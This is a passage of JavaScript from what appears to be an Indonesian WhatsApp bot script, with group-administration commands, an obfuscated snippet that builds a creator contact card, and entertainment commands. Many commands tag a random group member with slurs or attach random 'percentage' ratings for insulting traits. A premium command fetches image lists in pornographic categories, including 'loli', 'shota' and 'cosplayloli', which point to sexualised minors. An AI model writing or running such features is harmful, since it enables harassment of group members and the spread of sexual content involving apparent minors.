+ `N:;${global.ownerName}.;;;`
+ `FN:${global.ownerName}.\n`
+ `ORG:${global.ownerName};\n`
+ `TEL;type=CELL;type=VOICE;waid=${global.ownerNumber}:${global.ownerNumber}\n`
+ `END:VCARD`
var msg = await zeroyt7.sendMessage(from, { contacts: { displayName: `${global.owner}`, contacts: [{ vcard }] } }, { quoted: ftroli })
await sleep(1000)
var _0x5b730d=_0x1441;function _0x3a51(){var _0x40ecc9=['N:;','t.\x0a','OICE;waid=','TEL;type=C','ot;\x0a','owner','VERSION:3.','\x20Script\x20Bo','18TQoeXQ','r\x20Script\x20B','ELL;type=V','BEGIN:VCAR','sendMessag','ORG:Creato','6111WoNSOa','1369114iJaBRP','1763296SwcyrB','.;;;','11YmvRrs','FN:Creator','35ZNItWx','END:VCARD','15WZbKhX','1337270ktPWZS','650218CBpPVY','1232rXNTej','39902964bCANOf','1123194wUHTIt'];_0x3a51=function(){return _0x40ecc9;};return _0x3a51();}(function(_0x1e3474,_0x4ae7a8){var _0x126a23=_0x1441,_0x55caa1=_0x1e3474();while(!![]){try{var _0x16f2db=-parseInt(_0x126a23(0x158))/(0x1*0x1ae0+-0x1fbf+0x4*0x138)+-parseInt(_0x126a23(0x14f))/(-0x1*-0x7db+-0x1593+-0x1*-0xdba)+-parseInt(_0x126a23(0x14e))/(-0x13f6+-0x2221+0x361a)*(parseInt(_0x126a23(0x159))/(-0x386+0x214+-0xbb*-0x2))+parseInt(_0x126a23(0x156))/(-0x4*0x8dc+-0x112f+-0xc*-0x463)*(parseInt(_0x126a23(0x15b))/(0x4ae*0x4+-0x437+-0xe7b))+-parseInt(_0x126a23(0x154))/(-0x1544*0x1+-0x1fcd+0x3518)*(parseInt(_0x126a23(0x150))/(0x26e2+-0xf*0xd+-0x571*0x7))+-parseInt(_0x126a23(0x164))/(0x2bd+0xe2*0x1+-0x3*0x132)*(parseInt(_0x126a23(0x157))/(0x1cdb+-0x1*-0xa8b+0x2c*-0xe5))+parseInt(_0x126a23(0x152))/(-0x52d*-0x7+-0x22e3+-0x14d)*(parseInt(_0x126a23(0x15a))/(0x49*-0x53+-0x141b+0x47*0x9e));if(_0x16f2db===_0x4ae7a8)break;else _0x55caa1['push'](_0x55caa1['shift']());}catch(_0x1a98c1){_0x55caa1['push'](_0x55caa1['shift']());}}}(_0x3a51,0x17201+-0x10b1*0x23+0x94ec9));function _0x1441(_0x1b03dc,_0x362a55){var _0x303c2f=_0x3a51();return _0x1441=function(_0x13c45b,_0x124add){_0x13c45b=_0x13c45b-(-0x83*-0x2d+0x1*-0x1ca1+0x1*0x6e3);var _0x14bf3d=_0x303c2f[_0x13c45b];return _0x14bf3d;},_0x1441(_0x1b03dc,_0x362a55);}var vcard=_0x5b730d(0x14b)+'D\x0a'+(_0x5b730d(0x162)+'0\x0a')+(_0x5b730d(0x15c)+p+_0x5b730d(0x151))+(_0x5b730d(0x153)+_0x5b730d(0x163)+_0x5b730d(0x15d))+(_0x5b730d(0x14d)+_0x5b730d(0x149)+_0x5b730d(0x160))+(_0x5b730d(0x15f)+_0x5b730d(0x14a)+_0x5b730d(0x15e)+p+':'+p+'\x0a')+_0x5b730d(0x155),msg=await zeroyt7[_0x5b730d(0x14c)+'e'](from,{'contacts':{'displayName':''+global[_0x5b730d(0x161)],'contacts':[{'vcard':vcard}]}},{'quoted':ftroli});
}
break
case 'antilink': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply( mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (args[0] === 'enable'){
if (isAntilink) return reply(`*[ ANTILINK ]* Sudah Aktif Sebelumnya !`)
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
reply('*[ ANTILINK DI AKTIFKAN ]*\n\nYang Mengirim Link Group Akan Di Kick Otomatis Oleh Bot !')
} else if (args[0] === 'disable') { if (!isAntilink) return reply(`*[ ANTILINK ] Sudah Tidak Aktif Sebelumnya !*`)
anu = antilink.indexOf(from)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
reply('*[ ANTILINK DI NONAKTIFKAN ]*\n\nSemua Member Boleh Mengirimkan Link Group')
} else {
let buttons = [
{ buttonId: 'antilink enable', buttonText: { displayText: '✅Aktif' }, type: 1 },
{ buttonId: 'antilink disable', buttonText: { displayText: '❎Nonaktif' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Antilink`, creator, ftroli)
}
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!text) return reply(`Masukan Nomer Yang Mau Di Add\nContoh ${prefix + command} 628***`)
let add = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [add], 'add').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!text) return reply(`Masukan Nomer Yang Mau Di Kick\nContoh ${prefix + command} 628***`)
let kick = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [kick], 'remove').then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text) return reply(`Tag/Reply Nomer Admin Yang Mau Di Demote\nContoh ${prefix + command} Tag`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [users], 'promote').then((res) => reply(mess.succes)).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text) return reply(`Tag/Reply Nomer Admin Yang Mau Di Demote\nContoh ${prefix + command} Tag`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zeroyt7.groupParticipantsUpdate(from, [users], 'demote').then((res) => reply(mess.succes)).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text) return reply(`Masukan Text Nya\nContoh ${prefix + command} Please A Subscribe My Youtube Zero YT7`)
zeroyt7.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: ftroli })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!text) return reply(`Masukan Text Nya\nContoh ${prefix + command} Please A Subscribe My Youtube Zero YT7`)
let teks = `*_Tag All_*
 
💌 *Pesan :* ${q ? q : 'kosong'}\n\n`
for (let mem of participants) {
teks += `@${mem.id.split('@')[0]}\n`
}
zeroyt7.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: ftroli })
}
break
case 'group': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (args[0] === 'close'){
await zeroyt7.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await zeroyt7.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: '✅Buka' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: '❎Tutup' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Group`, creator, ftroli)
}
}
break
case 'setppgroup': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!quoted) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await zeroyt7.downloadAndSaveMediaMessage(quoted)
await zeroyt7.updateProfilePicture(from, { url: media }).catch((err) => fs.unlinkSync(media))
reply(mess.succes)
}
break
case 'linkgroup': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let response = await zeroyt7.groupInviteCode(from)
zeroyt7.sendText(from, `https://chat.whatsapp.com/${response}\n\n💌 Link Group : ${groupMetadata.subject}`, ftroli, { detectLink: true })
}
break
case 'ephemeral': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (args[0] === 'enable') {
await zeroyt7.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await zeroyt7.sendMessage(from, { disappearingMessagesInChat: false }).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'ephemeral enable', buttonText: { displayText: '✅Aktif' }, type: 1 },
{ buttonId: 'ephemeral disable', buttonText: { displayText: '❎Nonaktif' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Ephemeral Group`, creator, ftroli)
}
}
break
case 'setname': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!text) return reply(`Masukan Text Nya\nContoh ${prefix + command} Zero YT7`)
await zeroyt7.groupUpdateSubject(from, text).then((res) => reply(mess.succes)).catch((err) => reply(jsonformat(err)))
}
break
case 'setdesc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (!text) return reply(`Masukan Text Nya\nContoh ${prefix + command} Zero YT7`)
await zeroyt7.groupUpdateDescription(from, text).then((res) => reply(mess.succes)).catch((err) => reply(jsonformat(err)))
}
break
case 'editinfo': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !itsMezeroyt7) return reply(mess.admin)
if (args[0] === 'open'){
await zeroyt7.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'close'){
await zeroyt7.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: '✅Buka' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: '❎Tutup' }, type: 1 }
]
await zeroyt7.sendButtonText(from, buttons, `Silahkan Pilih Mode Edit Info`, creator, ftroli)
}
}
break
case 'memek':
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'peak':
case 'pantex':
case 'pantek':
case 'setan':
case 'iblis':
case 'cacat':
case 'yatim':
case 'piatu':
{
if (!m.isGroup) return reply(mess.group)
var member = participants.map((u) => u.id)
var org = member[Math.floor(Math.random() * member.length)]
zeroyt7.sendMessage(from, { text: `Anak ${command} Di Sini Adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: ftroli })
}
break
case 'goblokcek':
case 'jelekcek':
case 'gaycek':
case 'rate':
case 'lesbicek':
case 'gantengcek':
case 'cantikcek':
case 'begocek':
case 'suhucek':
case 'pintercek':
case 'jagocek':
case 'nolepcek':
case 'babicek':
case 'bebancek':
case 'baikcek':
case 'jahatcek':
case 'anjingcek':
case 'haramcek':
case 'pakboycek':
case 'pakgirlcek':
case 'sangecek':
case 'bapercek':
case 'fakboycek':
case 'alimcek':
case 'suhucek':
case 'fakgirlcek':
case 'kerencek':
case 'wibucek':
case 'pasarkascek':
case 'kulcek':                
case 'cekgoblok':
case 'cekjelek':
case 'cekgay':                
case 'ceklesbi':
case 'cekganteng':
case 'cekcantik':
case 'cekbego':
case 'ceksuhu':
case 'cekpinter':
case 'cekjago':
case 'ceknolep':
case 'cekbabi':
case 'cekbeban':
case 'cekbaik':
case 'cekjahat':
case 'cekanjing':
case 'cekharam':
case 'cekpakboy':
case 'cekpakgirl':
case 'ceksange':
case 'cekbaper':
case 'cekfakboy':
case 'cekalim':
case 'ceksuhu':
case 'cekfakgirl':
case 'cekkeren':
case 'cekwibu':
case 'cekpasarkas':
case 'cekkul':
if (!m.isGroup) return reply(mess.group)
var cek1 = body.slice(0)
var cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
zeroyt7.sendMessage(from, { text: 'Pertanyaan : *' + cek1 + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: ftroli })
} else if (mentionByTag[0] && isGroup) {
zeroyt7.sendMessage(from, { text: 'Pertanyaan : *' + cek1 + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: ftroli })
} else if (!mentionByReply && !mentionByTag[0]) {
zeroyt7.sendMessage(from, { text: 'Pertanyaan : *' + cek1 + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: ftroli })
}
break
case 'aesthetic': case 'ahegao': case 'akira': case 'akiyama': case 'ana': case 'anjing': case 'art': case 'ass': case 'asuna': case 'ayuzawa': case 'bdsm': case 'boneka': case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge': case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cuckold': case 'cum': case 'cyber': case 'darkjokes': case 'deidara': case 'doraemon': case 'eba': case 'elaina': case 'emilia': case 'ero': case 'erza': case 'exo': case 'femdom': case 'foot': case 'freefire': case 'gamewallpaper': case 'gangbang': case 'gifs': case 'glasses': case 'gremory': case 'hekel': case 'hentai': case 'hestia': case 'hijaber': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jahy': case 'jeni': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'kartun': case 'katakata': case 'keneki': case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'masturbation': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'milf': case 'minato': case 'mobil': case 'motor': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'orgy': case 'panties': case 'pentol': case 'pokemon': case 'profil': case 'programming': case 'pubg': case 'pussy': case 'randblackpink': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'tatasurya': case 'technology': case 'tejina': case 'tentacles': case 'thighs': case 'toukachan': case 'tsunade': case 'waifu': case 'wallhp': case 'wallml': case 'wallnime': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPrem) return reply(mess.premium)
reply(mess.wait)
var heyy
if (/aesthetic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/aesthetic.json')
if (/ahegao/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ahegao.json')
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ana.json')
if (/anjing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/anjing.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/art.json')
if (/ass/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ass.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ayuzawa.json')
if (/bdsm/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bdsm.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplaysagiri.json')
if (/cuckold/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cuckold.json')
if (/cum/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cum.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cyber.json')
if (/darkjokes/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/darkjokes.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/emilia.json')
if (/ero/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ero.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/femdom.json')
if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/foot.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gamewallpaper.json')
if (/gangbang/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gangbang.json')
if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gifs.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gremory.json')
if (/hekel/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hekel.json')
if (/hentai/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hentai.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hestia.json')
if (/hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hijaber.json')
if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hinata.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itori.json')
if (/jahy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jahy.json')
if (/jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaori.json')
if (/kartun/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kartun.json')
if (/katakata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/madara.json')
if (/masturbation/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/masturbation.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/miku.json')
if (/milf/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/milf.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/minato.json')
if (/mobil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/onepiece.json')
if (/orgy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/orgy.json')
if (/panties/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/panties.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pubg.json')
if (/pussy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pussy.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shota.json')
if (/tatasurya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tejina.json')
if (/tentacles/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tentacles.json')
